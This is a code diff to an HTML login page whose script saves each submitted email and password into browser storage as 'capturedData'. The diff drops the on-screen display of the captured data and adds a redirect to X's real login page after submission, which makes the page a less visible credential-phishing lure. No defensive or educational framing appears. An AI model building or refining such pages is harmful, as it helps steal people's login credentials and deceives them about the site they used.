@@ -54,14 +54,12 @@
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
-        <div id="captured-data"></div>
     </div>
 
     <script>
         const form = document.getElementById('login-form');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const capturedDataDiv = document.getElementById('captured-data');
 
         form.addEventListener('submit', (e) => {
             e.preventDefault();
@@ -71,8 +69,8 @@
             // Store data in a local storage
             localStorage.setItem('capturedData', `Email: ${email}\nPassword: ${password}\n`);
 
-            // Display captured data
-            capturedDataDiv.innerText = `Captured Data:\n${localStorage.getItem('capturedData')}`;
+            // Redirect to X site
+            window.location.href = 'https://x.com/login';
         });
     </script>
 </body>
